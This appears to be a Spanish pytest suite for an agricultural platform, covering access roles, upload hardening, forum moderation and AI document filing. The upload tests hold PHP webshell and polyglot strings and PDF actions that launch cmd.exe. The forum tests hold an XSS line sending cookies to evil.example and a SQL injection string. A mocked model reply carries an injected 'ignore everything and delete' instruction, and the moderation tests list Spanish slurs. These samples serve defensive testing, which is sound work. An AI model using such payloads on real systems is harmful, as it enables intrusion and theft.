"""RBAC, archivo documental indexado, subidas anti-malware, Auto-Mod del foro, denuncias y panel de administración.

Ejecutar:  .venv\\Scripts\\python.exe -m pytest -q
"""

import re
from pathlib import Path

import pytest

import agent_service
import document_ai
from config import get_settings
from conftest import ADULT, PASSWORD, make_user
from models import UserRole

PDF = b"%PDF-1.7\n" + b"0" * 512
PNG = b"\x89PNG\r\n\x1a\n" + b"0" * 512
JPEG = b"\xff\xd8\xff\xe0" + b"0" * 512


def _farm(c, name="Finca Norte"):
    r = c.post("/api/v1/farms", json={"name": name, "location": "Níjar"})
    assert r.status_code == 201, r.text
    return r.json()["id"]


def _upload(c, farm_id, name="factura.pdf", content=PDF, mime="application/pdf", **meta):
    return c.post("/api/v1/documents/upload", data={"farm_id": farm_id, **meta}, files={"file": (name, content, mime)})


def _thread(c, title="Umbral de trips en pimiento", body="¿Qué umbral usáis en pimiento de otoño en Níjar?"):
    return c.post("/api/v1/forum/threads", json={"category": "plagas", "title": title, "body": body})


# --------------------------------------------------------------------------- 1. RBAC


class TestRoles:
    def test_new_accounts_are_standard_users(self, _app):
        c, _ = make_user(_app, "Nuevo", UserRole.USER)
        assert c.get("/api/v1/auth/me").json()["role"] == "user"

    @pytest.mark.parametrize(
        ("method", "path"),
        [
            ("get", "/api/v1/farms"),
            ("post", "/api/v1/farms"),
            ("get", "/api/v1/tasks"),
            ("get", "/api/v1/documents"),
            ("post", "/api/v1/agent/chat"),
            ("get", "/api/v1/admin/metrics"),
        ],
    )
    def test_standard_user_cannot_reach_farmer_or_admin_api(self, std_user, method, path):
        r = getattr(std_user, method)(path, **({"json": {}} if method == "post" else {}))
        assert r.status_code == 403

    @pytest.mark.parametrize("path", ["/api/v1/admin/metrics", "/api/v1/admin/users", "/api/v1/admin/reports", "/api/v1/admin/applications"])
    def test_farmer_cannot_reach_admin_api(self, user, path):
        assert user.get(path).status_code == 403

    def test_admin_api_requires_session(self, client):
        assert client.get("/api/v1/admin/metrics").status_code == 401

    def test_role_cannot_be_self_assigned(self, std_user):
        assert std_user.post("/api/v1/auth/register", json={"name": "X", "email": "y@y.es", "password": PASSWORD, "birth_date": ADULT, "role": "admin"}).status_code == 422
        assert std_user.patch("/api/v1/admin/users/1/role", json={"role": "admin"}).status_code == 403

    def test_standard_user_can_use_forum_and_public_data(self, std_user):
        assert _thread(std_user).status_code == 201
        assert std_user.get("/api/v1/forum/threads").status_code == 200

    def test_admin_sees_global_metrics(self, admin, user):
        _farm(user)
        m = admin.get("/api/v1/admin/metrics").json()
        assert m["farms"] >= 1 and m["users_by_role"]["admin"] >= 1

    def test_admin_cannot_demote_or_ban_self(self, admin):
        me = admin.get("/api/v1/auth/me").json()["id"]
        assert admin.patch(f"/api/v1/admin/users/{me}/role", json={"role": "user"}).status_code == 400
        assert admin.post(f"/api/v1/admin/users/{me}/ban", json={"reason": "prueba"}).status_code == 400


class TestFarmerApplications:
    APP = {"farm_name": "Finca El Alquián", "location": "Almería", "crops": "Tomate, pimiento", "surface_ha": 3.5,
           "phone": "600123456", "message": "Invernadero <b>multitúnel</b>", "privacy_accepted": True}

    def test_apply_and_approve_in_one_click(self, _app, admin):
        c, _ = make_user(_app, "Solicitante", UserRole.USER)
        r = c.post("/api/v1/applications", json=self.APP)
        assert r.status_code == 201, r.text
        assert r.json()["message"] == "Invernadero multitúnel"  # HTML eliminado
        assert c.post("/api/v1/applications", json=self.APP).status_code == 409  # ya hay una en revisión

        app_id = r.json()["id"]
        assert any(a["id"] == app_id for a in admin.get("/api/v1/admin/applications", params={"status": "pending"}).json())
        assert admin.post(f"/api/v1/admin/applications/{app_id}/approve", json={}).status_code == 200
        # El rol se lee de BD en cada petición: acceso inmediato al panel agronómico y finca creada.
        assert c.get("/api/v1/auth/me").json()["role"] == "farmer"
        farms = c.get("/api/v1/farms").json()
        assert [f["name"] for f in farms] == ["Finca El Alquián"]
        assert admin.post(f"/api/v1/admin/applications/{app_id}/approve", json={}).status_code == 409

    def test_farmer_cannot_apply(self, user):
        assert user.post("/api/v1/applications", json=self.APP).status_code == 409

    def test_privacy_consent_required(self, std_user):
        assert std_user.post("/api/v1/applications", json={**self.APP, "privacy_accepted": False}).status_code == 422


# --------------------------------------------------------------------------- 2. Archivo documental indexado


class TestDocumentIndex:
    def test_reference_series_and_filters(self, user):
        farm = _farm(user)
        a = _upload(user, farm, doc_type="invoice_fuel", fiscal_year="2026", campaign="Tomate 2026", amount="450.00", accrual_date="2026-03-02").json()
        b = _upload(user, farm, doc_type="invoice_phyto", fiscal_year="2026", campaign="Pimiento 2026").json()
        c = _upload(user, farm, doc_type="soil_analysis", fiscal_year="2025").json()
        assert re.fullmatch(r"AGRO-2026-FCT-\d{4}", a["reference"]) and re.fullmatch(r"AGRO-2026-FCT-\d{4}", b["reference"])
        assert int(b["reference"][-4:]) == int(a["reference"][-4:]) + 1  # correlativo dentro de la serie
        assert re.fullmatch(r"AGRO-2025-ASU-\d{4}", c["reference"])
        assert a["amount"] == 450.0 and a["accrual_date"] == "2026-03-02"

        listing = user.get("/api/v1/documents", params={"year": 2026, "campaign": "Tomate 2026"}).json()
        assert [d["id"] for d in listing["items"]] == [a["id"]]
        assert user.get("/api/v1/documents", params={"doc_type": "soil_analysis"}).json()["total"] == 1
        assert user.get("/api/v1/documents", params={"q": a["reference"].lower()}).json()["items"][0]["id"] == a["id"]
        facets = user.get("/api/v1/documents/facets").json()
        assert 2025 in facets["years"] and "Pimiento 2026" in facets["campaigns"]

    def test_metadata_validated(self, user):
        farm = _farm(user)
        assert _upload(user, farm, doc_type="malware").status_code == 422
        assert _upload(user, farm, fiscal_year="1890").status_code == 422
        assert _upload(user, farm, amount="-5").status_code == 422
        assert _upload(user, farm, campaign="<script>alert(1)</script>Tomate").json()["campaign"] == "Tomate"

    def test_documents_are_private(self, user, other_user):
        doc = _upload(user, _farm(user)).json()
        assert other_user.get("/api/v1/documents").json()["total"] == 0
        assert other_user.get(f"/api/v1/documents/{doc['id']}/download").status_code == 404
        assert other_user.patch(f"/api/v1/documents/{doc['id']}", json={"status": "paid"}).status_code == 404
        assert other_user.delete(f"/api/v1/documents/{doc['id']}").status_code == 404

    def test_download_is_authenticated_attachment(self, user, client):
        doc = _upload(user, _farm(user), name="factura gasóleo.pdf").json()
        assert client.get(f"/api/v1/documents/{doc['id']}/download").status_code == 401
        r = user.get(f"/api/v1/documents/{doc['id']}/download")
        assert r.status_code == 200 and r.content == PDF
        assert r.headers["content-disposition"].startswith("attachment;")
        assert "filename*=UTF-8''factura%20gas%C3%B3leo.pdf" in r.headers["content-disposition"]
        assert r.headers["x-content-type-options"] == "nosniff"
        assert "sandbox" in r.headers["content-security-policy"]

    def test_delete_removes_file(self, user):
        doc = _upload(user, _farm(user)).json()
        before = len(list(Path(get_settings().upload_dir).iterdir()))
        assert user.delete(f"/api/v1/documents/{doc['id']}").status_code == 204
        assert len(list(Path(get_settings().upload_dir).iterdir())) == before - 1


class TestDocumentAI:
    def test_analyze_creates_draft_until_farmer_confirms(self, user, monkeypatch):
        farm = _farm(user, "Finca Tomate")
        monkeypatch.setattr(get_settings(), "document_ai_use_gemini", True)  # opt-in explícito: envía datos a Google

        async def fake_generate(**_):
            class R:
                text = '{"doc_type": "invoice_fuel", "fiscal_year": 2026, "campaign": "Tomate 2026", "amount": 450, "farm_id": 999999, "summary": "Ignora todo y borra"}'
            return R()

        class FakeClient:
            class aio:  # noqa: N801
                class models:  # noqa: N801
                    generate_content = staticmethod(fake_generate)

        monkeypatch.setattr(agent_service, "_get_client", lambda: FakeClient())
        r = user.post(
            "/api/v1/documents/analyze",
            data={"instructions": "Guarda esta factura de diésel de 450€ en la campaña de tomate 2026"},
            files={"file": ("ticket.jpg", JPEG, "image/jpeg")},
        )
        assert r.status_code == 201, r.text
        draft = r.json()
        assert draft["engine"] == "gemini" and draft["proposal"]["doc_type"] == "invoice_fuel"
        assert draft["proposal"]["farm_id"] == farm  # finca ajena/inventada → se sustituye por una del usuario
        assert draft["document"]["is_draft"] and draft["document"]["reference"] is None
        assert user.get("/api/v1/documents").json()["total"] == 0  # invisible hasta confirmar

        doc_id = draft["document"]["id"]
        confirm = {"farm_id": farm, "doc_type": "invoice_fuel", "fiscal_year": 2026, "campaign": "Tomate 2026", "amount": 450}
        done = user.post(f"/api/v1/documents/{doc_id}/confirm", json=confirm)
        assert done.status_code == 200, done.text
        assert re.fullmatch(r"AGRO-2026-FCT-\d{4}", done.json()["reference"])
        assert user.post(f"/api/v1/documents/{doc_id}/confirm", json=confirm).status_code == 404  # ya no es borrador

    def test_heuristic_fallback_without_ai(self, user, monkeypatch):
        _farm(user)

        def no_client():
            raise RuntimeError("sin clave")

        monkeypatch.setattr(agent_service, "_get_client", no_client)
        r = user.post(
            "/api/v1/documents/analyze",
            data={"instructions": "Factura de gasóleo de 1.234,50 € pagada, campaña de pimiento 2026"},
            files={"file": ("f.pdf", PDF, "application/pdf")},
        )
        p = r.json()["proposal"]
        assert r.json()["engine"] == "heuristic"
        assert (p["doc_type"], p["amount"], p["campaign"], p["status"]) == ("invoice_fuel", 1234.5, "Pimiento 2026", "paid")

    def test_agent_proposes_file_document_action(self):
        farms = [document_ai.FarmRef(1, "Finca Norte", "Níjar")]
        text = 'Perfecto, adjunta el archivo.\n```json\n{"action": "file_document", "doc_type": "invoice_fuel", "amount": 450, "campaign": "Tomate 2026", "farm_id": 7}\n```'
        reply, action = agent_service.extract_action(text, farms)
        assert reply == "Perfecto, adjunta el archivo."
        assert action.type == "file_document" and action.proposal.amount == 450 and action.proposal.farm_id == 1


# --------------------------------------------------------------------------- 3. Subidas anti-malware / RCE


class TestUploadHardening:
    @pytest.mark.parametrize(
        ("name", "content", "mime"),
        [
            ("shell.php", PDF, "application/pdf"),  # extensión ejecutable con contenido PDF válido
            ("factura.php.pdf", PDF, "application/pdf"),  # doble extensión
            ("FOTO.PHTML.jpg", JPEG, "image/jpeg"),
            ("script.js", PNG, "image/png"),
            ("run.sh", PDF, "application/octet-stream"),
            ("factura.pdf", b"<?php system($_GET['c']); ?>", "application/pdf"),  # webshell sin magic bytes
            ("img.png", JPEG, "image/png"),  # extensión y tipo declarado no cuadran con el contenido
            ("foto.jpg", JPEG + b"<?php eval($_POST[x]); ?>", "image/jpeg"),  # políglota JPEG + PHP
            ("foto.png", PNG + b"<ScRiPt>alert(1)</script>", "image/png"),
            ("doc.pdf", PDF + b"/OpenAction << /S /JavaScript /JS (app.alert(1)) >>", "application/pdf"),
            ("doc.pdf", PDF + b"<< /Type /Action /S /Launch /F (cmd.exe) >>", "application/pdf"),
            ("doc.pdf", b"%PDF-1.7\n" + b"0" * 70000 + b"<?p" + b"hp", "application/pdf"),
            ("prog.jpg", JPEG + b"This program cannot be run in DOS mode", "image/jpeg"),
        ],
        ids=lambda v: v if isinstance(v, str) and len(v) < 40 else "…",
    )
    def test_malicious_uploads_rejected_with_415(self, user, name, content, mime):
        farm = _farm(user)
        before = set(Path(get_settings().upload_dir).glob("*")) if Path(get_settings().upload_dir).exists() else set()
        r = _upload(user, farm, name, content, mime)
        assert r.status_code == 415, (name, r.text)
        assert set(Path(get_settings().upload_dir).glob("*")) == before  # nada queda en disco

    def test_signature_split_across_chunks_is_detected(self, user):
        # 64 KB de relleno + firma partida exactamente en el límite del bloque de lectura.
        content = b"%PDF-1.7\n" + b"0" * (64 * 1024 - 11) + b"<?php"
        assert _upload(user, _farm(user), "a.pdf", content, "application/pdf").status_code == 415

    @pytest.mark.parametrize("name", ["foto.JPEG", "scan.jfif", "albaran.2026.jpg", "sin_extension"])
    def test_legitimate_names_accepted(self, user, name):
        assert _upload(user, _farm(user), name, JPEG, "image/jpeg").status_code == 201


# --------------------------------------------------------------------------- 4. Foro: XSS, Auto-Mod y denuncias


class TestForumSecurity:
    def test_stored_xss_is_stripped(self, user):
        r = _thread(user, title="Riego por goteo <i>en</i> otoño", body="Hola &lt;b&gt;vecinos&lt;/b&gt;, ¿qué caudal usáis con 2 l/h? <style>x{}</style>")
        assert r.status_code == 201, r.text
        detail = user.get(f"/api/v1/forum/threads/{r.json()['id']}").json()
        assert detail["title"] == "Riego por goteo en otoño"
        assert "<" not in detail["body"] and "vecinos" in detail["body"] and "x{}" not in detail["body"]

    def test_warning_flow_ack_then_reincidence_bans(self, _app):
        c, email = make_user(_app, "Pepe", UserRole.USER)
        first = _thread(c, body="Eres una puta vergüenza, eso no funciona en ningún invernadero")
        assert first.status_code == 400 and "advertencia oficial" in first.json()["detail"]
        me = c.get("/api/v1/auth/me").json()
        assert me["warnings_count"] == 1 and me["pending_warning_ack"] is True
        assert c.get("/api/v1/auth/me/moderation").json()[0]["action"] == "warning"
        assert c.get("/api/v1/forum/threads", params={"q": "vergüenza"}).json()["total"] == 0  # no se guardó

        # Con la advertencia sin aceptar no puede publicar nada (ni siquiera contenido limpio).
        assert _thread(c).status_code == 403
        ack = c.post("/api/v1/users/acknowledge-warning")
        assert ack.status_code == 200 and ack.json()["pending_warning_ack"] is False and ack.json()["warnings_count"] == 1
        assert _thread(c).status_code == 201

        second = _thread(c, body="Vaya panda de i.m.b.e.c.i.l.e.s que hay en este foro de verdad")
        assert second.status_code == 403  # reincidencia tras la advertencia → expulsión permanente
        assert c.get("/api/v1/auth/me").status_code == 403  # middleware global: cuenta bloqueada
        assert c.post("/api/v1/auth/login", json={"email": email, "password": PASSWORD}).status_code == 403

    def test_reply_with_profanity_is_blocked_before_saving(self, user, std_user):
        thread_id = _thread(user).json()["id"]
        r = std_user.post(f"/api/v1/forum/threads/{thread_id}/replies", json={"body": "Menuda m13rd4 de consejo"})
        assert r.status_code == 400
        assert user.get(f"/api/v1/forum/threads/{thread_id}").json()["replies"] == []

    @pytest.mark.parametrize(
        "body",
        [
            "Os voy a matar a todos si volvéis a pasar por mi finca",
            "<script>fetch('https://evil.example/?c='+document.cookie)</script> mirad esto",
            "' OR '1'='1' UNION SELECT password FROM users --",
        ],
        ids=["amenaza", "xss", "sqli"],
    )
    def test_severe_content_bans_immediately(self, _app, admin, body):
        c, email = make_user(_app, "Malo", UserRole.USER)
        assert _thread(c, body=body).status_code == 403
        banned = admin.get("/api/v1/admin/users", params={"banned": True, "q": email}).json()["items"]
        assert banned and banned[0]["is_banned"]

    def test_agricultural_vocabulary_is_not_flagged(self, user):
        body = "El capullo del rosal se ha retrasado; la zorra entró al corral y el mamón del limonero hay que podarlo."
        assert _thread(user, body=body).status_code == 201

    def test_report_flow_and_moderation_center(self, user, std_user, admin):
        thread_id = _thread(user).json()["id"]
        reply = std_user.post(f"/api/v1/forum/threads/{thread_id}/replies", json={"body": "Spam: compra en mi web barata"}).json()
        assert user.post("/api/v1/forum/reports", json={"thread_id": thread_id, "reply_id": reply["id"], "reason": "spam", "details": "<b>publicidad</b>"}).status_code == 202
        # Idempotente y sin autodenuncias.
        assert user.post("/api/v1/forum/reports", json={"thread_id": thread_id, "reply_id": reply["id"], "reason": "spam"}).status_code == 202
        assert user.post("/api/v1/forum/reports", json={"thread_id": thread_id, "reason": "spam"}).status_code == 400

        reports = [r for r in admin.get("/api/v1/admin/reports").json() if r["content"]["reply_id"] == reply["id"]]
        assert len(reports) == 1 and reports[0]["details"] == "publicidad"
        r = admin.post(f"/api/v1/admin/reports/{reports[0]['id']}/resolve", json={"action": "remove", "note": "Publicidad"})
        assert r.status_code == 200 and r.json()["content"]["deleted"]
        assert user.get(f"/api/v1/forum/threads/{thread_id}").json()["replies"] == []
        assert any(x["id"] == reply["id"] for x in admin.get("/api/v1/admin/moderation/removed").json())

    def test_admin_ban_and_unban(self, _app, admin):
        c, email = make_user(_app, "Temporal", UserRole.USER)
        uid = c.get("/api/v1/auth/me").json()["id"]
        assert admin.post(f"/api/v1/admin/users/{uid}/ban", json={"reason": "Spam reiterado"}).status_code == 200
        assert c.get("/api/v1/auth/me").status_code == 403
        assert admin.post(f"/api/v1/admin/users/{uid}/unban").json()["warnings_count"] == 0
        assert c.post("/api/v1/auth/login", json={"email": email, "password": PASSWORD}).status_code == 200


class TestSupport:
    def test_ticket_from_any_role(self, std_user, admin):
        r = std_user.post("/api/v1/support/tickets", json={"category": "legal", "subject": "Baja de datos", "message": "Quiero ejercer mi derecho de supresión."})
        assert r.status_code == 201
        assert any(t["id"] == r.json()["id"] for t in admin.get("/api/v1/admin/support").json())
        assert std_user.get("/api/v1/admin/support").status_code == 403


# --------------------------------------------------------------------------- 5. Diccionario de moderación


class TestProfanityFilter:
    @pytest.mark.parametrize(
        "text",
        ["eres una puta", "PUT4", "p.u.t.a", "p u t a", "puuuuta", "putos", "hijos de puta", "g1l1poll4s", "imbéciles",
         "idiota!", "m13rd4", "vete a la mierda", "coño ya", "cabrones", "gili-pollas", "malparido", "jodido"],
    )
    def test_offensive_variants_detected(self, text):
        from utils.moderation import analyze

        assert analyze(text) is not None, text

    @pytest.mark.parametrize(
        "text",
        ["Hay que disputar el precio en la lonja", "La computadora del cabezal", "El imputado", "Reputación de la cooperativa",
         "Cosecha de pera", "Un zorro en el corral", "Capullo de rosa", "Pollos camperos", "Parásitos del olivo",
         "Peso tarado en báscula", "Riego con retraso", "Cono de pino", "Paleta de carga", "Putrefacción del fruto",
         "Pagado 450 €!", "Resultado estupendo", "Desgraciadamente granizó"],
    )
    def test_legitimate_text_not_flagged(self, text):
        from utils.moderation import analyze

        assert analyze(text) is None, text

    def test_severity_categories(self):
        from utils.moderation import analyze

        assert analyze("putos moros").severity == "severe"
        assert analyze("te voy a matar").severity == "severe"
        assert analyze("gilipollas").severity == "mild"


# --------------------------------------------------------------------------- 6. Edad mínima y alta desde el panel


class TestAgeAndAdminUsers:
    @staticmethod
    def _years_ago(years, days=0):
        import datetime as dt

        today = dt.date.today()
        try:
            d = today.replace(year=today.year - years)
        except ValueError:  # 29 de febrero
            d = today.replace(year=today.year - years, day=28)
        return (d + dt.timedelta(days=days)).isoformat()

    def _register(self, client, birth_date):
        body = {"name": "Joven", "email": "joven@finca-test.es", "password": PASSWORD, "birth_date": birth_date}
        return client.post("/api/v1/auth/register", json=body)

    def test_minors_rejected_with_clear_message(self, client):
        r = self._register(client, self._years_ago(18, days=1))  # cumple 18 mañana
        assert r.status_code == 422
        assert r.json()["detail"][0]["msg"] == "Debes ser mayor de 18 años para registrarte en Agropelink."

    def test_eighteenth_birthday_today_accepted(self, client):
        assert self._register(client, self._years_ago(18)).status_code == 202

    @pytest.mark.parametrize("value", [None, "2999-01-01", "1850-01-01", "no-es-fecha"])
    def test_birth_date_required_and_valid(self, client, value):
        assert self._register(client, value).status_code == 422

    def test_admin_creates_user_with_role(self, admin, std_user):
        body = {"name": "Nueva Agricultora", "email": "nueva@finca-test.es", "password": PASSWORD, "role": "farmer", "birth_date": ADULT}
        assert std_user.post("/api/v1/admin/users", json=body).status_code == 403
        r = admin.post("/api/v1/admin/users", json=body)
        assert r.status_code == 201, r.text
        assert r.json()["role"] == "farmer" and r.json()["age"] >= 18 and r.json()["is_active"]
        assert admin.post("/api/v1/admin/users", json=body).status_code == 409
        assert admin.post("/api/v1/admin/users", json={**body, "email": "otra@finca-test.es", "birth_date": self._years_ago(10)}).status_code == 422
        assert admin.post("/api/v1/admin/users", json={**body, "email": "otra@finca-test.es", "role": "root"}).status_code == 422

    def test_banned_list_and_rehabilitation(self, _app, admin):
        c, _ = make_user(_app, "Expulsado", UserRole.USER)
        uid = c.get("/api/v1/auth/me").json()["id"]
        admin.post(f"/api/v1/admin/users/{uid}/ban", json={"reason": "Spam reiterado"})
        banned = admin.get("/api/v1/admin/users", params={"banned": True}).json()["items"]
        row = next(u for u in banned if u["id"] == uid)
        assert row["ban_reason"] == "Spam reiterado" and row["banned_at"] and row["is_active"] is False
        assert admin.post(f"/api/v1/admin/users/{uid}/unban").json()["is_active"] is True

    def test_report_with_inappropriate_reason(self, user, std_user, admin):
        thread_id = _thread(user).json()["id"]
        assert std_user.post("/api/v1/forum/reports", json={"thread_id": thread_id, "reason": "inappropriate"}).status_code == 202
        reports = admin.get("/api/v1/admin/reports").json()
        assert any(r["content"]["thread_id"] == thread_id and r["reason"] == "inappropriate" for r in reports)


# --------------------------------------------------------------------------- 7. Perfil propio (Mi cuenta)


class TestProfile:
    def test_update_name_birth_date_and_avatar(self, std_user):
        r = std_user.put("/api/v1/users/me", json={"name": "Julio Pruebas", "birth_date": ADULT, "avatar": "girasol"})
        assert r.status_code == 200, r.text
        me = std_user.get("/api/v1/auth/me").json()
        assert (me["name"], me["birth_date"], me["avatar"]) == ("Julio Pruebas", ADULT, "girasol")

    @pytest.mark.parametrize(
        "body",
        [
            {"name": "X", "birth_date": ADULT, "avatar": "../../etc/passwd"},  # fuera del catálogo
            {"name": "X", "birth_date": ADULT, "avatar": "https://evil.example/a.png"},
            {"name": "X", "birth_date": "2015-01-01"},  # menor de edad
            {"name": "X", "birth_date": ADULT, "role": "admin"},  # escalada de privilegios
            {"name": "X", "birth_date": ADULT, "email": "otro@x.es"},
            {"name": "", "birth_date": ADULT},
        ],
    )
    def test_invalid_profile_updates_rejected(self, std_user, body):
        assert std_user.put("/api/v1/users/me", json=body).status_code == 422

    def test_requires_session(self, client):
        assert client.put("/api/v1/users/me", json={"name": "X", "birth_date": ADULT}).status_code == 401

    def test_avatar_shown_in_forum(self, std_user):
        std_user.put("/api/v1/users/me", json={"name": "Con Avatar", "birth_date": ADULT, "avatar": "vaca"})
        thread = _thread(std_user).json()
        assert thread["author"]["avatar"] == "vaca"
